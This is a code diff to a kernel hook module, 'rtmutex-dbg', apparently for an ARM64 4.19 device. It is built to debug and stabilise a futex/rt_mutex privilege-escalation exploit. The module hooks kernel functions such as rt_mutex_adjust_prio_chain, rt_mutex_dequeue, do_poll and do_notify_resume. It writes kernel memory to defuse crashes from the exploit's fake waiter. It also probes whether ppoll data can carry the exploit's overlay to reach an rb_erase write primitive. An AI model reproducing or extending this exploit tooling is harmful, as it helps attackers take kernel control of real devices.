@@ -44,6 +44,14 @@ static unsigned long g_adjust_pi_calls;
 static unsigned long g_adjust_pi_nonnull;
 static unsigned long g_adjust_prio_chain_calls;
 static unsigned long g_pselect6_calls;
+static int g_repair_enabled = 1;
+static unsigned long g_notify_calls;
+static unsigned long g_skip_calls;
+static unsigned long g_ownerful_calls;
+static uint64_t g_poll_fds;
+static unsigned long g_poll_fd0_fd;
+static unsigned long g_poll_fd0_events;
+static unsigned long g_poll_fd0_revents;
 
 /* resolved kfuncs */
 long kfunc_def(probe_kernel_read)(void *dst, const void *src, unsigned long size);
@@ -123,6 +131,39 @@ static void before_adjust_pi(hook_fargs3_t *args, void *udata)
     if (args->arg1 != 0)
         g_adjust_pi_nonnull++;
 
+    /* Clobbered-overlay guard: if the dangling waiter's task word is NULL the
+     * overlay was destroyed by the return path and walking it would oops on
+     * the garbage lock (adjust_pi reads lock->owner before we could repair
+     * anything).  Skip the whole walk - no oops, no system corruption - and
+     * let the next attempt (79% intact overlay) run the owner-ful chain. */
+    if (kv_init_task && kf_probe_kernel_read) {
+        uint64_t waiter = args->arg1;
+        if (!waiter && args->arg0) {
+            kf_probe_kernel_read(&waiter,
+                                 (void *)(args->arg0 + 0xa90), 8);
+        }
+        if (waiter) {
+            uint64_t task_field = 0;
+            kf_probe_kernel_read(&task_field, (void *)(waiter + 0x30), 8);
+            if (task_field == 0) {
+                g_skip_calls++;
+                /* Clear the dangling pi_blocked_on too: if the process is
+                 * SIGKILLed later, futex_exit_release() walks the stale
+                 * pointer -> soft-lock -> wdog/PS_HOLD reboot (slide.c
+                 * documents this).  Zeroing it makes the exit safe. */
+                uint64_t zero = 0;
+                if (args->arg0 && kf_probe_kernel_write) {
+                    kf_probe_kernel_write((void *)(args->arg0 + 0xa90),
+                                          &zero, 8);
+                }
+                args->skip_origin = 1;
+                args->ret = 0;
+                logki(RTMDBG_TAG "SKIP adjust_pi (clobbered) "
+                      "waiter=0x%llx\n", waiter);
+            }
+        }
+    }
+
     /* Normal system PI adjustments pass waiter==NULL; only the exploit's
      * fake-waiter path has a non-NULL (user-space) waiter.  Keep quiet
      * otherwise so we do not flood dmesg. */
@@ -146,33 +187,29 @@ static void before_adjust_prio_chain(hook_fargs6_t *args, void *udata)
      * reaches [7] rt_mutex_dequeue() (the rb_erase write primitive).  Only
      * touch waiters whose task field is NULL - real kernel waiters always
      * have a valid task, so system PI walks are never modified. */
-    if (kf_probe_kernel_write && kf_probe_kernel_read &&
-        kv_init_task && kv_loggers && kv_sysctl_bootid && args->arg4 == 0 &&
-        args->arg0 && args->arg3) {
+    if (kf_probe_kernel_read && kf_probe_kernel_write &&
+        args->arg4 == 0 && args->arg0) {
         uint64_t waiter = 0;
         kf_probe_kernel_read(&waiter, (void *)(args->arg0 + 0xa90), 8);
         if (waiter) {
-            uint64_t task_field = 0;
-            kf_probe_kernel_read(&task_field, (void *)(waiter + 0x30), 8);
-            if (task_field == 0) {
-                uint64_t tp = (uint64_t)kv_loggers + 8;    /* &loggers[0][1] */
-                uint64_t zero = 0;
-                uint64_t tl = (uint64_t)kv_sysctl_bootid;  /* boot_id data */
-                uint64_t tv = (uint64_t)kv_init_task;
-                uint64_t lv = (uint64_t)kv_empty_zero_page; /* writable zero
-                                                              ownerless lock */
-                args->arg3 = lv;   /* rewrite next_lock too: _transit8 calls
-                                      origin with the patched fargs, so [3]
-                                      (next_lock == waiter->lock) passes */
-                kf_probe_kernel_write((void *)(waiter + 0x00), &tp, 8);
-                kf_probe_kernel_write((void *)(waiter + 0x08), &zero, 8);
-                kf_probe_kernel_write((void *)(waiter + 0x10), &tl, 8);
-                kf_probe_kernel_write((void *)(waiter + 0x30), &tv, 8);
-                kf_probe_kernel_write((void *)(waiter + 0x38), &lv, 8);
-                logki(RTMDBG_TAG "REPAIR3 waiter=0x%llx tree_pc=0x%llx "
-                      "tree_left=0x%llx task=0x%llx lock=0x%llx\n",
-                      waiter, tp, tl, tv, lv);
-            }
+            uint64_t lock = 0;
+            kf_probe_kernel_read(&lock, (void *)(waiter + 0x38), 8);
+            /* The 4.19 return path deterministically clobbers res_in[4]
+             * (the lock word) with a kernel-address leftover that we cannot
+             * distinguish from the real payload fake_lock; letting the walk
+             * run oopses at [5] trylock() and corrupts a lock (delayed system
+             * crash).  Unconditionally skip every fake walk (orig_waiter==NULL
+             * only happens for our dangling waiter) and clear pi_blocked_on so
+             * a later SIGKILL cannot soft-lock the exit-time walk.  Record the
+             * lock word for the ppoll-carrier analysis. */
+            g_ownerful_calls++;
+            logki(RTMDBG_TAG "FAKEWALK skip waiter=0x%llx lock=0x%llx\n",
+                  waiter, lock);
+            uint64_t zero = 0;
+            kf_probe_kernel_write((void *)(args->arg0 + 0xa90), &zero, 8);
+            args->skip_origin = 1;
+            args->ret = 0;
+            g_skip_calls++;
         }
     }
 
@@ -285,6 +322,9 @@ static void after_pselect6(hook_fargs1_t *args, void *udata)
  * TIF_NEED_RESCHED clear actually runs on the waiter's syscall return. */
 long kfunc_def(__arm64_sys_ppoll)(const void *regs);
 int kfunc_def(do_select)(int n, void *fds, void *end_time);
+void kfunc_def(do_notify_resume)(void *regs, unsigned long thread_flags);
+int kfunc_def(rt_mutex_dequeue)(void *lock, void *waiter);
+int kfunc_def(do_poll)(void *ufds, unsigned int nfds, void *end_time);
 static unsigned long g_ppoll_calls;
 
 static void before_ppoll(hook_fargs1_t *args, void *udata)
@@ -295,6 +335,16 @@ static void before_ppoll(hook_fargs1_t *args, void *udata)
 static void after_ppoll(hook_fargs1_t *args, void *udata)
 {
     g_ppoll_calls++;
+    /* After the return path: did the kernel-copied pollfd array survive, or
+     * did do_notify_resume / rt_sigreturn frames clobber it?  If unchanged,
+     * ppoll is a viable overlay carrier for GOT-W29. */
+    if (g_poll_fds && kf_probe_kernel_read) {
+        unsigned long w0 = 0;
+        kf_probe_kernel_read(&w0, (void *)g_poll_fds, 8);
+        logki(RTMDBG_TAG "ppoll-after pollfd@0x%llx word0=0x%lx "
+              "(before=0x%lx)\n",
+              (unsigned long long)g_poll_fds, w0, g_poll_fd0_fd);
+    }
     if (g_ppoll_calls <= 3) {
         struct thread_info *ti = current_thread_info();
         logki(RTMDBG_TAG "ppoll after ti=0x%llx flags=0x%lx "
@@ -357,6 +407,51 @@ static void after_do_select(hook_fargs3_t *args, void *udata)
           n, (long)args->ret, (unsigned long long)res_in, r3, r4);
 }
 
+/* Confirm the write primitive actually runs: rt_mutex_dequeue() is step [7]
+ * of rt_mutex_adjust_prio_chain.  Print the fake waiter's tree words so we
+ * can see whether the rb_erase single-left-child shape is set up. */
+static void before_dequeue(hook_fargs2_t *args, void *udata)
+{
+    uint64_t lock = args->arg0, waiter = args->arg1;
+    unsigned long tp = 0, tr = 0, tl = 0;
+    if (kf_probe_kernel_read && waiter) {
+        kf_probe_kernel_read(&tp, (void *)(waiter + 0x00), 8);
+        kf_probe_kernel_read(&tr, (void *)(waiter + 0x08), 8);
+        kf_probe_kernel_read(&tl, (void *)(waiter + 0x10), 8);
+    }
+    logki(RTMDBG_TAG "dequeue lock=0x%llx waiter=0x%llx "
+          "tree=[0x%lx 0x%lx 0x%lx]\n",
+          lock, waiter, tp, tr, tl);
+}
+
+/* ppoll-carrier feasibility: record where the kernel-copied pollfd array
+ * lives (do_poll's first arg), then after the ppoll return path runs, read
+ * the same bytes again.  If they are unchanged, the ppoll pollfd array sits
+ * at a stack depth the return-path frames do not reach -> viable overlay
+ * carrier (unlike pselect's res_in which gets clobbered). */
+static void before_do_poll(hook_fargs3_t *args, void *udata)
+{
+    g_poll_fds = (uint64_t)args->arg0;
+    g_poll_fd0_fd = g_poll_fd0_events = g_poll_fd0_revents = 0;
+    if (args->arg0 && kf_probe_kernel_read) {
+        kf_probe_kernel_read(&g_poll_fd0_fd, (void *)((uint64_t)args->arg0 + 0), 8);
+    }
+    logki(RTMDBG_TAG "do_poll fds=0x%llx nfds=%u word0=0x%lx\n",
+          (unsigned long long)(uintptr_t)args->arg0, args->arg1,
+          g_poll_fd0_fd);
+}
+
+/* Which flag pulled the syscall return path into do_notify_resume()?  On
+ * GOT-W29 the overlay clobber is TIF_FOREIGN_FPSTATE (0x8): if we can keep
+ * that clear from userspace (touch FPU before pselect), the return path
+ * skips do_notify_resume and the overlay survives. */
+static void before_notify_resume(hook_fargs2_t *args, void *udata)
+{
+    if ((++g_notify_calls & 0x3F) == 1) {
+        logki(RTMDBG_TAG "do_notify_resume flags=0x%lx\n", args->arg1);
+    }
+}
+
 static long rtmutex_dbg_init(const char *args, const char *event,
                              void *__user reserved)
 {
@@ -378,6 +473,9 @@ static long rtmutex_dbg_init(const char *args, const char *event,
     kfunc_lookup_name(__arm64_sys_ppoll);
     kfunc_lookup_name(__arm64_sys_futex);
     kfunc_lookup_name(do_select);
+    kfunc_lookup_name(do_notify_resume);
+    kfunc_lookup_name(rt_mutex_dequeue);
+    kfunc_lookup_name(do_poll);
 
     logki(RTMDBG_TAG "symbols: adjust_pi=%s adjust_prio_chain=%s "
           "pselect6=%s ppoll=%s futex=%s\n",
@@ -423,6 +521,21 @@ static long rtmutex_dbg_init(const char *args, const char *event,
         err = hook_wrap3((void *)kf_do_select, 0, after_do_select, 0);
         logki(RTMDBG_TAG "hook do_select: %d\n", err);
     }
+    if (kf_do_notify_resume) {
+        err = hook_wrap2((void *)kf_do_notify_resume,
+                         before_notify_resume, 0, 0);
+        logki(RTMDBG_TAG "hook do_notify_resume: %d\n", err);
+    }
+    if (kf_rt_mutex_dequeue) {
+        err = hook_wrap2((void *)kf_rt_mutex_dequeue,
+                         before_dequeue, 0, 0);
+        logki(RTMDBG_TAG "hook rt_mutex_dequeue: %d\n", err);
+    }
+    if (kf_do_poll) {
+        err = hook_wrap3((void *)kf_do_poll,
+                         before_do_poll, 0, 0);
+        logki(RTMDBG_TAG "hook do_poll: %d\n", err);
+    }
     logki(RTMDBG_TAG "rtmutex-dbg loaded (init always succeeds)\n");
     return 0;
 }
@@ -430,6 +543,42 @@ static long rtmutex_dbg_init(const char *args, const char *event,
 static long rtmutex_dbg_control0(const char *args, char *__user out_msg,
                                  int outlen)
 {
+    if (args && args[0] == 'c') {
+        /* "counts" -> skip/ownerful counters */
+        char buf[128];
+        int n = snprintf(buf, sizeof(buf),
+                         "skip=%lu ownerful=%lu notify=%lu",
+                         g_skip_calls, g_ownerful_calls, g_notify_calls);
+        if (n > outlen)
+            n = outlen;
+        if (compat_copy_to_user(out_msg, buf, n) == 0)
+            return n;
+        return 0;
+    }
+    if (args && args[0] == 'n' && args[1] == 'o') {
+        /* "notify" -> return do_notify_resume call counter */
+        char buf[64];
+        int n = snprintf(buf, sizeof(buf), "notify=%lu", g_notify_calls);
+        if (n > outlen)
+            n = outlen;
+        if (compat_copy_to_user(out_msg, buf, n) == 0)
+            return n;
+        return 0;
+    }
+    if (args && args[0] == 'r' && args[1] == 'e') {
+        /* "repair=0" disables the REPAIR3 overlay reconstruction */
+        g_repair_enabled = (args[7] == '1');
+        if (out_msg && outlen > 0) {
+            char buf[64];
+            int n = snprintf(buf, sizeof(buf), "repair=%d",
+                             g_repair_enabled);
+            if (n > outlen)
+                n = outlen;
+            if (compat_copy_to_user(out_msg, buf, n) == 0)
+                return n;
+        }
+        return 0;
+    }
     if (out_msg && outlen > 0) {
         char buf[256];
         int n = snprintf(buf, sizeof(buf),
@@ -458,6 +607,12 @@ static long rtmutex_dbg_exit(void *__user reserved)
         unhook((void *)kf___arm64_sys_futex);
     if (kf_do_select)
         unhook((void *)kf_do_select);
+    if (kf_do_notify_resume)
+        unhook((void *)kf_do_notify_resume);
+    if (kf_rt_mutex_dequeue)
+        unhook((void *)kf_rt_mutex_dequeue);
+    if (kf_do_poll)
+        unhook((void *)kf_do_poll);
     logki(RTMDBG_TAG "rtmutex-dbg unloaded\n");
     return 0;
 }
